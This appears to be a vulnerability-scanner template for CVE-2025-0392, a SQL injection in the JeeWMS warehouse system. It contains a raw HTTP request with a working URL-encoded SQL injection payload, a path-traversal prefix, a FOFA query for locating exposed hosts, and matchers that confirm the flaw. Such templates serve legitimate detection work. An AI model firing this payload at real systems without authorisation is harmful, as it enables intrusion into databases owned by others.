id: CVE-2025-0392

info:
  name: JeeWMS graphReportController SQL Injection
  author: onewin
  severity: high
  description: |
    JeeWMS is vulnerable to a SQL injection vulnerability in the `graphReportController.do` endpoint, allowing attackers to execute arbitrary SQL commands.
  metadata:
    fofa-query: body="url:userController.do?userOrgSelect&userId=" && "loginController.do?changeDefaultOrg"
  tags: jeewms

http:
  - raw:
      - |
        GET /rest/../graphReportController.do?datagridGraph&configId=CWSYL&store_code=1%27+AND+GTID_SUBSET%28CONCAT%280x7178627a71%2C%28SELECT+%28ELT%284503%3D4503%2C1%29%29%29%2C0x717a6a6b71%29%2C4503%29--+wnMN HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive
        
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "qxbzq1qzjkq"
        part: body
      - type: status
        status:
          - 200